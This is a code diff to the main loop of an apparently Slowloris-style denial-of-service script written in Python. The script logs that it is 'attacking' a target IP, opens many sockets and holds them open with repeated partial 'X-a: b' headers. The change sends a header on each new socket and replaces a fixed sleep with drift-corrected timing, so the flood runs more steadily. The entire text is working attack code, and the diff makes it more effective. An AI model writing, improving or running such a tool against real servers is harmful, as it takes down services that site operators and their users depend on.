@@ -103,16 +103,27 @@ def main():
     logging.info("Attacking %s with %s sockets.", ip, socket_count)
 
     logging.info("Creating sockets...")
+    start_time = time.time()
+
     for _ in range(socket_count):
         try:
             logging.debug("Creating socket nr %s", _)
             s = init_socket(ip)
+            if s:
+                s.send("X-a: b\r\n".encode("utf-8"))
+                list_of_sockets.append(s)
         except socket.error:
             break
-        list_of_sockets.append(s)
+
+    interval = 100.0
+    elapsed_time = time.time() - start_time
+    sleep_time = max(0, 100 - elapsed_time)
+    time.sleep(sleep_time)
+    next_cycle = time.time()
 
     while True:
         logging.info("Sending keep-alive headers... Socket count: %s", len(list_of_sockets))
+
         for s in list(list_of_sockets):
             try:
                 s.send("X-a: b\r\n".encode("utf-8"))
@@ -127,7 +138,11 @@ def main():
                     list_of_sockets.append(s)
             except socket.error:
                 break
-        time.sleep(100)
+
+        next_cycle += interval
+        sleep_time = max(0, round(next_cycle - time.time(), 6))
+        logging.debug("Sleeping for %.6f seconds", sleep_time)
+        time.sleep(sleep_time)
 
 if __name__ == "__main__":
     main()
